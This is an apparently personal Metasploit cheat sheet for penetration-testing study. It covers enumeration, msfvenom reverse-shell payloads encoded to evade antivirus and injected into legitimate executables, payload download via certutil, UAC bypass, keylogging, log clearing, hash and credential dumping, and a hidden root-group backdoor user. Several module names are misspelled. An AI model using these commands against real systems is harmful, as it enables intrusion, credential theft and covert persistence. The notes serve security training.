# Metasploit

###### MSF Overview
- MSF Module
	- Exploit - A module that is used to take advantage of vulnerability and is typically paired with a payload.
	- Payload - Code that is delivered by MSF and remotely executed on the target after successful exploitation. An example of a payload is a reverse shell that initiates a connection from the target system back to the attacker.
	- Encoder - Used to encode payloads in order to avoid AV detection. For example, shikata_ga_nai is used to encode Windows payloads.
	- NOPS - Used to ensure that payloads sizes are consistent and ensure the stability of a payload when executed.
	- Auxiliary - A module that is used to perform additional functionality like port scanning and enumeration.

-  MSF Payload Types
	- Non-Staged Payload - Payload that is sent to the target system as is along with the exploit.
	- Staged Payload - A staged payload is sent to the target in two parts, whereby:
		The first part (stager) contains a payload that is used to establish a reverse connection back to the attacker, download the second part of the payload (stage) and execute it.

###### Metasploit Fundamentals
- `sudo systemctl enable postgresql` -- enable the postgresql for using msfdb
- `sudo systemctl start postgresql`
- `sudo msfdb init` -- to initialize the msfdb 
- `sudo msfdb reinit` -- to restart the msfdb (it ill delete and start the db)
- ![[MSF Module Variables.png]]
- `search cve:2017 type:exploit platform:-windows` -- to search in msf 
- `connect IP PORT` -- similar to telnet
- `hosts` -- to see all the hosts add to msf
- `workspace -a [NAME]` -- to name a workspace (default workspace is there by default)
- `workspace [NAME]` -- to change workspace
- `workspace -d [NAME]` -- to delete workspace

---
---

# Information Gathering & Enumeration

###### NMAP
- to import scan result in msf
	- `service postgresql start` -- to start db
	- `nmap -Pn -sV 10.2.23.1 -oX output` -- need to save file in excel format to import
	- `db_status` -- to check after starting msf console
	- `db_import /path/to/file`
	- `host` -- will display the hst which we have imported via file
	- `services` -- will show the services 
- `db_nmap -Pn -sV -O 10.2.12.2` -- to use nmap in msf
- `vulns` to list out the vulnerabilities 

###### Enumeration
- port scan
	- `auxiliary/scanner/portscan/tcp` -- for tcp scan
	- `run autoroute -s 192.168.12.32` -- if you are in a network there are multiple networks other than the one you are on so add the ip in route in meterpreter 
- FTP 
	- `auxiliary/scanner/ftp/ftp_version` -- for ftp version
	- `auxiliary/scanner/ftp/ftp_login` -- for ftp brute force
- SMB
	- `auxiliary/scanner/smb/smb_version` -- for smb version
	- `auxiliary/scanner/smb/smmb_enumusers` -- for smb enum users
	- `auxiliary/scanner/smb/smmb_enumshares` -- for smb enum shares
	- `auxiliary/scanner/smb/smb_login` -- for smb brute force
- Web Server
	- `auxiliary/scanner/http/http_version` -- for http version
	- `auxiliary/scanner/http/http_header` -- for http header
	- `auxiliary/scanner/http/robots_txt` -- for robots.txt
	- `auxiliary/scanner/http/dir_scanner` -- for directory scanner
	- `auxiliary/scanner/http/files_dir` -- for file scanner
	- `auxiliary/scanner/http/http_login` -- for http login for brute force
		- `unset USERPASS_FILE` -- because we have user_file and pass_file option
	- `auxiliary/scanner/http/apache_userdir_enum` -- for apache "mod_userdir" user enum 
- MYSQL 
	- `auxiliary/scanner/mysql/mysql_version` -- for mysql version
	- `auxiliary/scanner/mysql/mysql_login` -- for mysql login
	- `auxiliary/admin/mysql/mysql_enum` -- for mysql enum -- works only if we have cred
	- `auxiliary/admin/mysql/mysql_sql` -- for mysql query run -- works only if we have cred
	- `auxiliary/scanner/mysql/mysql_schemadump` -- for mysql schema dump
- SSH
	- `auxiliary/scanner/ssh/ssh_version` -- for ssh version
	- `auxiliary/scanner/ssh/ssh_login` -- for ssh login -- if target is config for pass auth
	- `auxiliary/scanner/ssh/ssh_enumusers` -- for ssh enum users
- SMTP
	- `auxiliary/scanner/smtp/smtp_version` -- for smtp version
	- `auxiliary/scanner/smtp/smtp_enum` -- for smtp enum
	- `nmap -sV -script banner 192.80.153.3` -- to give banner info

---
---

# Vulnerability Scanning

###### MSF
 - `db_nmap -sS -sV -O 10.0.2.2` -- result of nmap will be added to msf database
 - `info` -- to see more info about module
- download [this](https://github.com/hahwul/metasploit-autopwn) to get exploit recommendation and after downloading `load db_autopwn` in msf useage `db_autopwn -p -t -PI 445`
- `analyze` -- will give analysis of target and exploits
- `vulns` -- will give vuln list
	-  `vulns -p 445`
###### Web Apps
- `load wmap`
- `wmap_sites -a [ip or url or vhost]` -- to add the target site or IP
- `wmap_targets -t http://192.168.10.1` -- to set the target directory ('/' or '/login/something')
- `wmap_run -t` -- will load all the relevant module
- `wmap_run -e`
- `wmap_vulns -l` -- list all vulns wmap found

---
---

# Client-Side Attacks

##### Payloads
- `msfvenom --list payload` -- list the payload
- `msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=[Your IP] LPORT=1234 -f exe > /path/to/payload.exe`
- `msfvenom --list formats`
- set up hander (before executing payload)
	- use multi/handler
	- set payload windows/x64/meterpreter/reverse_tcp
	- set LHOST 10.12.12.1
	- set LPORT 1234
	- run
- Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature
- `msfvenom --list encoders`
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP] LPORT=1234 -i 10 -e x86/shikata_ga_mai -f exe > /path/to/payload.exe`
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP] LPORT=1234 -i 10 -e x86/shikata_ga_mai -f exe -x /path/to/exe/file/for/injection > /path/to/payload.exe` -- to inject the payload in portable executable
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP] LPORT=1234 -i 10 -e x86/shikata_ga_mai -f exe -k -x /path/to/exe/file/for/injection > /path/to/payload.exe` -- to inject the payload in portable executable while keeping original functionality of exe

---
---

# Exploitation

###### Windows Exploitation
- Winrm
	- `auxiliary/scanner/winrm/winrm_login`
	- `auxiliary/scanner/winrm/winrm_cmd`
- Apache V58.5.19
	- `exploit/multui/http/tomcat_jsp_upload_bypass`
	- `set payload java/jsp_shell_bind_tcp`
	- `set SHELL cmd`
	- the above will only give shell for meterpreter we need to upload the exe
	- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP] LPORT=1234 -f exe > meterpreter.exe`
	- `python3 -m http.server 80` 
	- on shell 
	- `certutil -urlcache -f http://[your IP]/meterpreter.exe meterpreter.exe`
	- now make .rc file
		- vim handler.rc
		- use multi/handler
		- set PAYLOAD windows/meterpreter/reverse_tcp
		- set LPORT 1234
		- set LHOST [YOUR IP]
		- run
	- msfconsole -r handler.rc
	- on shell .\meterpreter.exe
###### Linux Exploitation
- always search for versions (eg., libssh-ssh, haraka smtp) instead of name

###### Post Exploitation Fundamentals
- checksum md5 /bin/bash -- to give md5 hash
- search /  -f * flag * 
- `use post/multi/manage/shell_to_meterpreter` -- to shell to c OR
	- sessions -u (session id)

###### Windows Post Exploitation
- Windows Post Exploitations Modules
	- `getsystem` -- will give us the elevated priv
	- show_mount -- will show drive mount details
	- `post/windows/manage/archmigrate` -- will migrate or change the architecture of meterpreter session
	- `post/windows/gather/win_priv` -- to gather privileges enumeration 
	- `post/windows/gather/enum_logged_on_users`
	- `post/windows/gather/checkvm` -- check if server is VM or not and also give host of VM
	- `post/windows/gather/enum_applications` -- will show us what programs are installed on target system
	- `post/windows/gather/enum_av_excluded`
	- `post/windows/gather/enum_computers` -- find info about system in the domain
	- `post/windows/gather/enum_patches` -- enum all the applied patches 
	- `post/windows/gather/enum_shares`
- Bypassing UAC 
	- `net users` -- run on shell and will give list of all accounts
	- `explot/windows/local/bypassuac_injection`
		- `set TARGET windows\ x64`
		- `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
- Establishing Persistence On Windows
	- Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.
	- `exploit/windows/local/persistance_service`
		- `set payload windows/meterpreter/reverse_tcp`
		- `set session [id]`
	- After losing the connection (killing the session)
		- `exploit/multi/handler`
		- `set payload windows/meterpreter/reverse_tcp` --  same as previous
		- `set LHOST [your ip]` -- same as previous
-  Enabling RDP
	- `exploit/windows/mange/enable_rdp`
	- after enabling rdp confirm it via `nmap -p3389 [ip]`
	- use shell in meterpreter session
	- `net user administrator [new password]` -- to change the administrator password
	-  `xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[IP:PORT]
- Windows Keylogging
	- `keyscan_start` -- start the key logging (it is meterpreter cmd)
	- `keyscan_dump` - it will dump the keystroke
- Clearing Windows Event Logs
	- you need elevated priv in order to clear event logs
	- `clearev` -- will clear the logs (it is meterpreter cmd)
- Pivoting
	- ![[Pivoting Visualized.png]]
	- once we have access to victim 1 add it's route to meterpreter by `run autoroute -s 10.10.10.0/24`
	- we cannot scan nmap on victim 2 directly (only within msfconsole), we need to set up port forwarding. Port forwarding essentially allows us to afford the remote port 80 to our local port 1234 
		- `portfwd add -l 1234 -p 80 -r 10.10.10.3` -- it is meterpreter cmd
		- Do not close the msfconsole
		- `nmap -sV -sS -p 1234 localhost`
		- when trying to use exploit use `set PAYLOAD windows/meterpreter/bind_tcp`

###### Linux Post Exploitation
- Linux Post Exploitation Modules 
	- `post/linux/gather/enum_configs` -- this will gather all the linux configuration
		- `loot` --  it will tell you where all the info is saved 
	- `post/multi/gather/env` -- will gather env variable 
	- `post/linux/gather/enum_network` -- this will gather all the network info
	- `post/linux/gather/enum_protections` -- this will gather all the info about hardening
		- `notes` -- msf feature that will save all the important info
	- `post/linux/gather/enum_system` -- this will gather all the system
	- `post/linux/gather/checkcontainer` -- this will check if system is a container or not
	- `post/linux/gather/checkvm` -- this will check if the system is a vm or not
	- `post/linux/gather/enum_users_history` -- this will gather all the users on the system
-  Exploiting A Vulnerable Program
	- `cat /etc/*issue` -- on shell this will give the distribution release version
	- `ps aux` -- on shell will list the process running on system
- Dumping Hashes With Hashdump
	- `post/linux/gather/hashdump`
	- `post/multi/gather/ssh_creds` -- will collect the contents of all users' .ssh directories, known_hosts and  authorized_keys 
	- `post/multi/gather/docker_creds` -- will find docker related creds
	- `post/linux/gather/enum_psk` -- gathers NetworkManager's plaintext "psk" information
	- `post/linux/gather/phpmyadmin_credsteal` --  gathers Phpmyadmin creds
	- `post/linux/gather/pptpd_chap_secrets` -- will collects PPTP VPN information such as client, server, password, and IP
- Establishing Persistence On Linux
	- creating backdoor
		- create a user that cannot be identified easily 
		- `useradd -m ftp -s /bin/bash`
		- `passwd ftp`
		- `usermod -aG root ftp` -- add user to root group to give root priv
	- using Persistence module
		- `post/linux/manage/sshkey_persistence`
		- `set createsshfolder true`
		- `loot` -- to get the private ssh key
		- exit the msfconfole
		- copy the key to ssh_key file
		- `chmod 400 ssh_key`
		- `ssh -i ssh_key root@IP`

###### Armitage
- Port Scanning & Enumeration With Armitage
	- 